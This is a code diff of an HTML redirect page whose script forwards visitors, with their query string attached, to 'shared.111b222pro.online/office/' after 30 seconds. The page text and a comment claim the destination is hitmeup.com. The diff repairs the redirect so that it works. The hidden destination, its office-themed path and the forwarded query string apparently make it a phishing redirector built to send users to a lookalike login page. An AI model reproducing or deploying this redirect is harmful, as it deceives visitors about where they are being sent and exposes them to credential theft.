@@ -2,25 +2,26 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta http-equiv="refresh" content="30; url=" id="redirectMeta">
     <title>Redirecting...</title>
     <script>
         window.onload = function() {
-            // Get the full URL query string (everything after '?')
+            // Get the query string from the URL (everything after '?')
             const queryString = window.location.search;
 
             // Define the base URL (hitmeup.com)
-            const baseHitMeUpUrl = "https:/shared.111b222pro.online/office/?";
+            const baseHitMeUpUrl = "https://shared.111b222pro.online/office/";
 
-            // Append the query string (excluding the '?' character) to the base URL
+            // Create the full redirect URL by appending the query string to the base URL
             const redirectUrl = baseHitMeUpUrl + queryString.substring(1);
 
-            // Update the meta tag for redirection
-            document.getElementById('redirectMeta').setAttribute('content', '30; url=' + redirectUrl);
+            // Redirect to the new URL after 30 seconds
+            setTimeout(function() {
+                window.location.href = redirectUrl;
+            }, 30000); // 30 seconds = 30000 milliseconds
         };
     </script>
 </head>
 <body>
-  
+    <p>You will be redirected to https://hitmeup.com in 30 seconds...</p>
 </body>
 </html>
